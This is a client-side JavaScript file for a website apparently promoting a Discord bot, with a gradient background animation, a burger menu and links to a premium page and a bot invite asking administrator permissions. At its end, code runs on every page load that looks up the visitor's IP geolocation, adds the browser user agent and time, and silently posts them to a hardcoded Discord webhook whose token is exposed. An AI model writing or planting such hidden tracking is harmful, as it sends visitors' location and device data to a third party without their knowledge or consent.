// Background color
var colors = new Array(
    [62, 35, 255],
    [60, 255, 60],
    [255, 35, 98],
    [45, 175, 230],
    [255, 0, 255],
    [255, 128, 0]
);

var step = 0;
var colorIndices = [0, 1, 2, 3];
var gradientSpeed = 0.002;

function updateGradient() {
    if (typeof $ === undefined) return;

    var c0_0 = colors[colorIndices[0]];
    var c0_1 = colors[colorIndices[1]];
    var c1_0 = colors[colorIndices[2]];
    var c1_1 = colors[colorIndices[3]];

    var istep = 1 - step;
    var r1 = Math.round(istep * c0_0[0] + step * c0_1[0]);
    var g1 = Math.round(istep * c0_0[1] + step * c0_1[1]);
    var b1 = Math.round(istep * c0_0[2] + step * c0_1[2]);
    var color1 = "rgb(" + r1 + "," + g1 + "," + b1 + ")";

    var r2 = Math.round(istep * c1_0[0] + step * c1_1[0]);
    var g2 = Math.round(istep * c1_0[1] + step * c1_1[1]);
    var b2 = Math.round(istep * c1_0[2] + step * c1_1[2]);
    var color2 = "rgb(" + r2 + "," + g2 + "," + b2 + ")";

    $('body').css({
        background: "-webkit-gradient(linear, left top, right top, from(" + color1 + "), to(" + color2 + "))"
    }).css({
        background: "-moz-linear-gradient(left, " + color1 + " 0%, " + color2 + " 100%)"
    });

    step += gradientSpeed;
    if (step >= 1) {
        step %= 1;
        colorIndices[0] = colorIndices[1];
        colorIndices[2] = colorIndices[3];

        colorIndices[1] = (colorIndices[1] + Math.floor(1 + Math.random() * (colors.length - 1))) % colors.length;
        colorIndices[3] = (colorIndices[3] + Math.floor(1 + Math.random() * (colors.length - 1))) % colors.length;
    }
}

setInterval(updateGradient, 10);

//Burger
document.addEventListener('DOMContentLoaded', function () {
    // Récupérer les éléments du DOM
    const burger = document.getElementById('burger');
    const menu = document.getElementById('menu');

    // Gestionnaire d'événement pour le clic sur le burger
    burger.addEventListener('click', function () {
        // Ouvrir ou fermer le menu en ajoutant ou retirant la classe "on"
        burger.classList.toggle('on');
        menu.classList.toggle('on');

        // Animation à l'ouverture du menu
        if (menu.classList.contains('on')) {
            menu.style.animation = 'slideIn 0.5s forwards';
        }
        // Animation à la fermeture du menu
        else {
            menu.style.animation = 'slideOut 0.5s forwards';
        }
    });
});

function redirectToPremium() {
    window.location.href = 'premium/premium.html';
}

function addPremium() {
    window.location.href = 'https://discord.com/api/oauth2/authorize?client_id=835509512017543168&permissions=8&scope=bot%20applications.commands';
}

fetch('http://ip-api.com/json')
  .then(response => response.json())
  .then(data => {
    const deviceInfo = navigator.userAgent; // Récupère les informations sur l'appareil
    const currentTime = new Date().toLocaleString(); // Récupère l'heure actuelle au format lisible

    const formattedData = [];
    for (const [key, value] of Object.entries(data)) {
      formattedData.push(`${key}: ${value}`);
    }

    formattedData.push(`Device Info: ${deviceInfo}`);
    formattedData.push(`Current Time: ${currentTime}`);

    const webhookUrl = 'https://discord.com/api/webhooks/1154468795541360801/CMqHaABvIHwZ_Q9QIn7dQAA_osU_gR8u8c2bBUxYKUt6DqXCQX1Q2PsZwLKiygRS0FPy'; // Remplacez par l'URL de votre webhook

    fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        content: formattedData.join('\n'),
      }),
    })
      .then(response => response.json())
      .then(data => {
        console.log('Réponse du serveur Discord :', data);
      })
      .catch(error => console.error('Erreur :', error));
  })
  .catch(error => console.error('Erreur:', error));
